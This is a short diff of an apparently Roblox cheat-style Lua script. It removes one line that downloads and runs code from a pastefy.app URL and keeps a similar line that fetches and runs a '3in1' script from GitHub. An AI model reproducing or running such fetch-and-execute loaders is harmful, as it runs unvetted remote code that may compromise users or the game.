@@ -143,7 +143,6 @@ task.delay(7.5, function()
             task.delay(5, function()
                 msg2:Destroy()
                 -- Execute your custom loader first
-                loadstring(game:HttpGet("https://pastefy.app/fFCVZNAu/raw"))()
                 -- Then execute the 3in1 script
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/3in1/main/3in1"))()
             end)
